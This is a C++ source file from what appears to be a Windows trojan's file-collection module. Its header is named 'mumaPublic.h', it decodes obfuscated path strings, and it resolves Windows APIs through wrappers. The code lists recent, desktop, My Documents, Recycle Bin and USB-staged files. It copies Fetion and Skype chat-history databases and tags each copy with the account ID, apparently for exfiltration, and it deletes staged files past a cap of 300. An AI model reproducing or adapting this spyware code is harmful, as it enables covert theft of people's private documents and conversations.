// SpecDir.cpp: implementation of the SpecDir class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "SpecDir.h"
#include "Struct.h"
#include "io.h"
#include <shlobj.h>
#include "FileWork.h"
#include "UsbDisk.h"
#include "stdio.h"
#include "mumaPublic.h"
#include "WinApi.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

BOOL AddToFileList(DIRLIST& filelist,WCHAR* filename,FILETIME filetime, FILETIME ftcreate, FILETIME ftaccess,unsigned __int64 filesize,int filetype)
{
	FileFILEINFO *tp;
	if (0 == (filelist.filecount&15))
	{
		tp = new FileFILEINFO[filelist.filecount+16];
		memcpy(tp, filelist.filelist, filelist.filecount*sizeof(FileFILEINFO));
		memset(tp+filelist.filecount, 0, sizeof(FileFILEINFO)*16);
		delete[] filelist.filelist;
		filelist.filelist = tp;
	}
 	tp = filelist.filelist + filelist.filecount++;
	wcscpy(tp->filename, filename);
	tp->filetime = filetime;
	tp->filesize = filesize;
	tp->filetype = filetype;
	tp->createfiletime = ftcreate;
	tp->accesstime = ftaccess;
	
	return TRUE;
}

// 最近的文档目录
BOOL GetRecentPath(WCHAR *path, DWORD &buflen)
{
	memset(path, 0, buflen*sizeof(WCHAR));
	if(PSHGetSpecialFolderPathW(NULL, path, CSIDL_RECENT, TRUE))//
	{
		if (_waccess(path, 0) == 0)
		{
			return TRUE;
		}
	}

	return FALSE;
}

// 取得Office最近访问的文档目录
BOOL GetOfficeRecentPath(WCHAR *path, DWORD &buflen)
{
	WCHAR tmpstr[30];
	memset(path, 0, buflen*sizeof(WCHAR));
	if(PSHGetSpecialFolderPathW(NULL, path, CSIDL_APPDATA, TRUE))
	{
		//\\Microsoft\\Office\\Recent
		wcscat(path, DeFileStringW(tmpstr, 30, L"\\lyksJYJZG\\-ZZyki\\WikiLG"));
		if(_waccess(path, 0) == 0)
		{
			return TRUE;
		}
	}
	return FALSE;
}

// 取得快捷方式文件名LinkFileName 的源文件位置,以szPath返回
BOOL GetShortcutTarget(const WCHAR* LinkFileName, WCHAR* szPath, DWORD& buflen, WIN32_FIND_DATAW &pfd)
{
	PCoInitialize(NULL);
	DWORD tmplen;
	HRESULT hres;
	WCHAR *Temp = new WCHAR[MAX_PATH];
	ZeroMemory(Temp, MAX_PATH);
	BOOL bRet = TRUE;
	IShellLinkW* psl = NULL;	//Create the ShellLink object
	hres = PCoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*) &psl);
	if (SUCCEEDED(hres))
	{
		IPersistFile*  ppf=0;//Bind the ShellLink object to the Persistent File
		hres = psl->QueryInterface( IID_IPersistFile, (LPVOID *) &ppf);
		if (SUCCEEDED(hres))
		{			
//			WORD wsz[MAX_PATH];//Get a UNICODE wide string wsz from the Link path
//			MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, LinkFileName, -1, wsz, MAX_PATH);//Read the link into the persistent file
			hres = ppf->Load(LinkFileName, 0);
			if (SUCCEEDED(hres))
			{
				psl->GetPath(Temp, 1024, &pfd, SLGP_RAWPATH);

				tmplen = wcslen(Temp);

				//assert( pfd.ftLastWriteTime.dwHighDateTime >0 && pfd.ftLastWriteTime.dwLowDateTime);
				if(buflen < tmplen)
					bRet = FALSE;
				else
				{
					wcsncpy(szPath, Temp, tmplen);
				}
			}	
		}
		else
		{
			buflen = 0;
			bRet = FALSE;
		}
		if(ppf != NULL)
			ppf->Release();
	}
	else
	{
		buflen = 0;
		bRet = FALSE;
	}
	if(psl != NULL)
		psl->Release();
	PCoUninitialize();
	//Return the Target and the Argument as a CString
	return bRet;
}


//////////////////////////////////////////////////////////////////////////

int UpdateRecentFile(const WCHAR *recentDir,DIRLIST& filelist)
{
	WCHAR szTmp[MAX_PATH];
	WCHAR szFileName[MAX_PATH];
	DWORD buflen1;
	
	WCHAR searchpath[MAX_PATH];
	swprintf(searchpath, L"%s\\*.lnk", recentDir);
	HANDLE hfindfile;
	WIN32_FIND_DATAW finddata;
	try
	{
		
		hfindfile = PFindFirstFileW(searchpath, &finddata);
		if (hfindfile != INVALID_HANDLE_VALUE)
		{
			do{
				ZeroMemory(szTmp, MAX_PATH);
				swprintf(szTmp,L"%s\\%s",recentDir,finddata.cFileName);
				ZeroMemory(szFileName, MAX_PATH);
				buflen1 = MAX_PATH;
				
				WIN32_FIND_DATAW pfd;
				if(FALSE == GetShortcutTarget(szTmp, szFileName, buflen1,pfd))
					continue;
				else
				{
					char sDrive[4];
					memset(sDrive, 0, sizeof(sDrive));
			//		sDrive[0] = szFileName[0];
					memcpy(sDrive, szFileName, 1);
					sDrive[1] = ':';
					sDrive[2] = '\\';
					
					UINT nType = PGetDriveTypeA( sDrive );
					if(nType!=DRIVE_FIXED )
						continue;
					if(_waccess(szFileName,0)!=0)
						continue;
					if(pfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ){
						continue;
					}
				}
				

				unsigned __int64 filesize=0;
				FILETIME filetime, ftcreate, ftaccess;
				if(QueryFileInfo(szFileName, filetime, ftcreate, ftaccess, filesize) )
				{
					AddToFileList(filelist, szFileName, filetime, ftcreate, ftaccess, filesize, 0);
				}
				
				
			}while(PFindNextFileW(hfindfile, &finddata));
			
			PFindClose(hfindfile);
		}
	} 
	catch (...) 
	{
		//DownloadRecent Catch Error!\r\n
	}
	
	return 1;
}


//////////////////////////////////////////////////////////////////////////
BOOL CheckRecentFileList(DIRLIST& filelist,char* filetype)
{
	WCHAR swapPath[MAX_PATH];
	DWORD buflen=MAX_PATH;

	if(GetRecentPath(swapPath, buflen) == TRUE)
		UpdateRecentFile(swapPath, filelist);
	
	if(GetOfficeRecentPath(swapPath, buflen) == TRUE)
		UpdateRecentFile(swapPath, filelist);
	
	return TRUE;
}

BOOL CheckMyDocList(DIRLIST& filelist,WCHAR* filetype)
{
	WCHAR wdir[MAX_PATH];
	if(PSHGetSpecialFolderPathW(NULL, wdir, CSIDL_PERSONAL, TRUE))
	{
		wcscpy(filelist.rootdir, wdir);
		GetFileList(wdir,filelist, filetype, 0);
 		return TRUE;	
	}
	return FALSE;
}

BOOL CheckDeskTopList(DIRLIST& filelist,WCHAR* filetype)
{
	WCHAR wdir[MAX_PATH];
	if(PSHGetSpecialFolderPathW(NULL, wdir, CSIDL_DESKTOPDIRECTORY, TRUE))
	{
		wcscpy(filelist.rootdir, wdir);
		GetFileList(wdir,filelist, filetype,0);
 		return TRUE;	
	}
	return FALSE;
}

BOOL CheckUsbFileList(DIRLIST& filelist,WCHAR* filetype)
{
	char usbfiledir[MAX_PATH];
	GetUsbFileFolder(usbfiledir);

	WCHAR wusbfiledir[MAX_PATH];
	GB23122Unicode(usbfiledir, wusbfiledir, MAX_PATH*sizeof(WCHAR));
 
	wcscpy(filelist.rootdir, wusbfiledir);
	GetFileList(wusbfiledir, filelist, filetype, 0);
	//首先过滤此文件夹,过期5天的删除
	SYSTEMTIME stm;
	PGetLocalTime(&stm);
	
	BOOL delflg=FALSE;
	if(filelist.filecount>300)
	{
		delflg=TRUE;
	}
	int delcount=filelist.filecount-300;

	for(int i=0;i<filelist.filecount;i++)
	{
		if(delflg)
		{
			 
// 			SYSTEMTIME ftime;
//		FILETIME filetime;
// 			PFileTimeToLocalFileTime(&filelist.filelist[i].filetime,&filetime);
// 			PFileTimeToSystemTime(&filetime, &ftime);
// 			if(stm.wYear==ftime.wYear && stm.wMonth==ftime.wMonth && (stm.wDay-ftime.wDay)>5)
// 			{
// 				PDeleteFileA(filelist.filelist[i].filename);
// 				filelist.filelist[i].filetype=2;
// 			}
// 			else  if(stm.wYear==ftime.wYear&& stm.wMonth>ftime.wMonth)
// 			{
// 				PDeleteFileA(filelist.filelist[i].filename);
// 				filelist.filelist[i].filetype=2;
// 			}
// 			else if(stm.wYear>ftime.wYear)
// 			{
// 				PDeleteFileA(filelist.filelist[i].filename);
// 				filelist.filelist[i].filetype=2;
// 			}
// 			if(filelist.filelist[i].filesize>1*1024*1024 ) //如果文件超多 删除大于1m的
// 			{
// 				PDeleteFileA(filelist.filelist[i].filename);
// 				filelist.filelist[i].filetype=2;
// 				delcount--;
// 			}
			if(delcount>0)
			{
				PDeleteFileW(filelist.filelist[i].filename);
				filelist.filelist[i].filetype=2;
				delcount--;
			}
		}
	}
	return TRUE;
}

//获取回收站文件
BOOL CheckRecycleFileList(DIRLIST& filelist,WCHAR* filetype)
{
	char pdr[256];
	memset(pdr, 0, 256);
	int len = PGetLogicalDriveStringsA(256, pdr);
	char* p = pdr+len-4;
	for (; p >= pdr; p -= 4)
	{
		if ((*p == 'A') || (*p == 'a') ||
			(*p == 'B') || (*p == 'b'))
			continue;
		switch(PGetDriveTypeA(p))
		{
		case DRIVE_FIXED:	// 本地磁盘
			break;
		default:
			continue;
		}
		
		//////////////////////////////////////////////////////////////////////////
		//搜索回收站文件

		char dir[MAX_PATH];
		memset(dir, 0, MAX_PATH);

		sprintf(dir, "%s$RECYCLE.BIN", p);

		WCHAR wdir[MAX_PATH];
		GB23122Unicode(dir, wdir, MAX_PATH*sizeof(WCHAR));

		wcscpy(filelist.rootdir, wdir);
		GetFileList(wdir,filelist,filetype,0);	
	}

	return TRUE;
}

BOOL CheckFetionFileList(DIRLIST& filelist, char* filetype)
{
	char FetionDir[MAX_PATH];  
	if(!PSHGetSpecialFolderPathA(NULL,FetionDir,CSIDL_APPDATA,0))
		return FALSE;

	strcat(FetionDir, "\\Fetion");

	if (_access(FetionDir, 0) != 0)
	{
		memset(FetionDir, 0, MAX_PATH);
		if(!PSHGetSpecialFolderPathA(NULL,FetionDir,CSIDL_PERSONAL,0))
			return FALSE;
		strcat(FetionDir, "\\Fetion");
	}

	WCHAR wFetionDir[MAX_PATH];
	GB23122Unicode(FetionDir, wFetionDir, MAX_PATH*sizeof(WCHAR));

	try
	{
		WCHAR SearchPath[MAX_PATH];
		wcscpy(SearchPath, wFetionDir);
		wcscat(SearchPath, L"\\*.*");
		HANDLE hfindfile;
		WIN32_FIND_DATAW finddata;
		hfindfile = PFindFirstFileW(SearchPath, &finddata);
		if (hfindfile != INVALID_HANDLE_VALUE)
		{
			do{
				if (finddata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{
					if(finddata.cFileName[0] == '.')
						continue;
					
					WCHAR FetionMsg[MAX_PATH];
					WCHAR BakFetionMsg[MAX_PATH];
					swprintf(FetionMsg,  L"%s\\%s\\history2.dat", wFetionDir, finddata.cFileName);
					swprintf(BakFetionMsg, L"%s\\%s\\history.imw", wFetionDir, finddata.cFileName);

					if (_waccess(FetionMsg, 0) != 0)
					{
						swprintf(FetionMsg,  L"%s\\%s\\V5_History.dat", wFetionDir, finddata.cFileName);
					}

					if(_waccess(FetionMsg, 0) == 0)
					{
						PCopyFileW(FetionMsg, BakFetionMsg, FALSE);
						FILE* file = _wfopen(BakFetionMsg, L"ab");
						if(file)
						{
							fseek(file, 0, SEEK_END);
							/*添加信息*/
							fwrite("\1",		1,	1,		file);		//文档类型
							fwrite("\6",		1,	1,		file);		//块长度
							fwrite("fetion",	1,	6,		file);		//数据

							char UserId[50];
							memset(UserId, 0, sizeof(UserId));
							Unicode2UTF_8(finddata.cFileName, UserId, 49);
							UCHAR numlen = strlen(UserId);
							
							fwrite("\2",		1,	1,		file);		//Key
							fwrite(&numlen,		1,	1,		file);		//块长度
							fwrite(UserId,1,	numlen,	file);		//数据
							
							int totallen = 1+1+6+1+1+numlen;
							fwrite(&totallen, 1,	4,		file);
							fwrite("\xDD\xCC\xBB\xAA",	1, 4,file);

							fclose(file);

							FILETIME	filetime, ftcreate, ftaccess;
							unsigned __int64		filesize;
							if(QueryFileInfo(BakFetionMsg, filetime, ftcreate, ftaccess, filesize) )
							{
								AddToFileList(filelist, BakFetionMsg, filetime, ftcreate, ftaccess, filesize, 0);
							}
						}
					}
				}
			}while(PFindNextFileW(hfindfile, &finddata));
			
			PFindClose(hfindfile);
		}
	}
	catch (...) 
	{
	}
	
	return TRUE;
}

BOOL CheckSkypeFileList(DIRLIST& filelist, char* filetype)
{
	char SkypeDir[MAX_PATH];  
	if(!PSHGetSpecialFolderPathA(NULL,SkypeDir,CSIDL_APPDATA,0))
		return FALSE;

	strcat(SkypeDir, "\\Skype");

	WCHAR wSkypeDir[MAX_PATH];
	GB23122Unicode(SkypeDir, wSkypeDir, MAX_PATH*sizeof(WCHAR));

	try
	{
		WCHAR SearchPath[MAX_PATH];
		wcscpy(SearchPath, wSkypeDir);
		wcscat(SearchPath, L"\\*.*");
		HANDLE hfindfile;
		WIN32_FIND_DATAW finddata;
		hfindfile = PFindFirstFileW(SearchPath, &finddata);
		if (hfindfile != INVALID_HANDLE_VALUE)
		{
			do{
				if (finddata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{
					if(finddata.cFileName[0] == L'.')
						continue;
					
					WCHAR SkypeMsg[MAX_PATH];
					WCHAR BakSkypeMsg[MAX_PATH];
					swprintf(SkypeMsg,  L"%s\\%s\\main.db", wSkypeDir, finddata.cFileName);
					swprintf(BakSkypeMsg, L"%s\\%s\\main.imw", wSkypeDir, finddata.cFileName);
					if(_waccess(SkypeMsg, 0) == 0)
					{
						PCopyFileW(SkypeMsg, BakSkypeMsg, FALSE);
						FILE* file = _wfopen(BakSkypeMsg, L"ab");
						if(file)
						{
							fseek(file, 0, SEEK_END);
							/*添加信息*/
							fwrite("\1",		1,	1,		file);		//文档类型
							fwrite("\5",		1,	1,		file);		//块长度
							fwrite("skype",		1,	5,		file);		//数据

							char UserId[50];
							Unicode2UTF_8(finddata.cFileName, UserId, 49);

							UCHAR numlen = strlen(UserId);
							
							fwrite("\2",		1,	1,		file);		//Key
							fwrite(&numlen,		1,	1,		file);		//块长度
							fwrite(UserId,	1,	numlen,	file);		//数据

							fwrite("\3\1",		1,	1,		file);		//NUMBER
							fwrite(&numlen,		1,	1,		file);		//块长度
							fwrite(UserId,1,	numlen,	file);		//数据
							
							int totallen = 1+1+5+1+1+numlen+1+1+numlen;
							fwrite(&totallen, 1,	4,		file);
							fwrite("\xDD\xCC\xBB\xAA",	1, 4,file);

							fclose(file);

							FILETIME	filetime, ftcreate, ftaccess;
							unsigned __int64		filesize;
							if(QueryFileInfo(BakSkypeMsg,filetime, ftcreate, ftaccess,filesize) )
							{
								AddToFileList(filelist, BakSkypeMsg, filetime, ftcreate, ftaccess, filesize, 0);
							}
						}
					}

				}
			}while(PFindNextFileW(hfindfile, &finddata));
			
			PFindClose(hfindfile);
		}
	}
	catch (...) 
	{
		//CheckSkypeFileList Error!\r\n
	}
	
	return TRUE;
}

BOOL CheckFeiqFileList(DIRLIST& filelist, char* filetype)
{
	return TRUE;
}
